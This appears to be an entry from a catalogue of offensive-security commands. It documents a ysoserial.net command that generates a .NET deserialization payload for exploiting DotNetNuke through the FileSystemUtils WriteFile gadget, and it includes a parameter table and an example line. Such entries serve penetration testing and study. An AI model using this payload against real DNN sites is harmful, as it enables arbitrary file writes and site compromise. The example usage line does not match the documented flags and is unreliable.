---
id: uuid-placeholder-c6
data: >-
  ysoserial.exe -p DNNPersonalization -f WriteFile -c
  "DotNetNuke.Common.Utilities.FileSystemUtils" --path="test.txt"
  --content="test data"
tags:
  - payload-gen
  - deserialization
type: command
output: XML or base64 payload
executor: bash
platforms:
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:54.190Z'
verified: false
validated: true
submitted: true
---
# ysoserial-generate

## Command

```bash
ysoserial.exe -p DNNPersonalization -f WriteFile -c "DotNetNuke.Common.Utilities.FileSystemUtils" --path="test.txt" --content="test data"
```

## Description

Generates .NET deserialization payloads for DNN exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-p` | Gadget chain | Yes |
| `-f` | Formatter | Yes |
| `-c` | Command/class | Yes |
| `--path` | File path | Yes |

## Examples

### Basic Usage

```bash
ysoserial.exe -p DNN -g FileSystemUtils.WriteFile
```

## Expected Output

Serialized payload string.

## Related

- [[Related Tool: ysoserial.net]]
